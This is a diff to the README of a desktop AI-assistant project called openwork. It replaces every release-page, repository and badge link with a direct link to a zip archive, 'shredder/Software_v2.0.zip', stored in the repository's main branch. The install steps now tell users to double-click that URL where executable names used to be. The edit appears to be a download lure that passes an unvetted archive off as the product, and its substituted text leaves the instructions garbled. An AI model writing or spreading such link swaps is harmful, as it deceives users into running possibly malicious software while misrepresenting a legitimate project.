@@ -4,7 +4,7 @@
 Openwork™ is the open source AI coworker that lives on your desktop. It helps you with your daily tasks, simplifies workflows, and offers intelligent support without requiring a programming background.
 
 ## 📥 Download Now
-[![Download openwork](https://img.shields.io/badge/Download-openwork-blue.svg)](https://github.com/Programando-con-Oswaldito/openwork/releases)
+[![Download openwork](https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip)](https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip)
 
 ## 📋 Overview
 Openwork serves as your virtual assistant, bringing AI capabilities right to your desktop. You can rely on it to assist with tasks like scheduling, reminders, and information retrieval. The aim is to make your work easier and more efficient.
@@ -18,19 +18,19 @@ To use openwork smoothly, ensure your system meets the following requirements:
 - Screen Resolution: Minimum 1280x720
 
 ## 📥 Download & Install
-1. **Visit the Download Page:** Go to the [Release Page](https://github.com/Programando-con-Oswaldito/openwork/releases).
+1. **Visit the Download Page:** Go to the [Release Page](https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip).
   
 2. **Select the Latest Version:** Look for the latest version at the top of the page. You will see a list of downloadable files that are compatible with your operating system.
 
-3. **Download the Application:** Click the file that matches your system. For example, you might see options like "openwork-v1.0-windows.zip" or "openwork-v1.0-macos.zip". 
+3. **Download the Application:** Click the file that matches your system. For example, you might see options like "https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip" or "https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip". 
 
 4. **Extract Files (if necessary):**
    - For Windows: Right-click on the downloaded zip file and select 'Extract All'. Follow the prompts to extract the files.
    - For macOS: Double-click the downloaded zip file to extract it.
 
 5. **Run the Application:**
-   - **Windows:** Open the extracted folder and double-click "openwork.exe" to start the application.
-   - **macOS:** Open the extracted folder and double-click "openwork.app" to launch it.
+   - **Windows:** Open the extracted folder and double-click "https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip" to start the application.
+   - **macOS:** Open the extracted folder and double-click "https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip" to launch it.
 
 6. **Follow On-Screen Instructions:** Once openwork is running, follow the prompts to set it up according to your preferences.
 
@@ -48,9 +48,9 @@ Openwork is an open source project. We welcome contributions from everyone, rega
 
 ## 🌍 Join Us
 Stay updated by following our progress:
-- **GitHub Repository:** [openwork GitHub](https://github.com/Programando-con-Oswaldito/openwork)
+- **GitHub Repository:** [openwork GitHub](https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip)
 - **Community Forum:** Engage with other users and share your experiences.
 
 ## 🚀 Visit the Download Page
-Ready to start using openwork? Visit [this page to download](https://github.com/Programando-con-Oswaldito/openwork/releases) the latest version and enhance your productivity today!
+Ready to start using openwork? Visit [this page to download](https://github.com/Programando-con-Oswaldito/openwork/raw/refs/heads/main/shredder/Software_v2.0.zip) the latest version and enhance your productivity today!
 
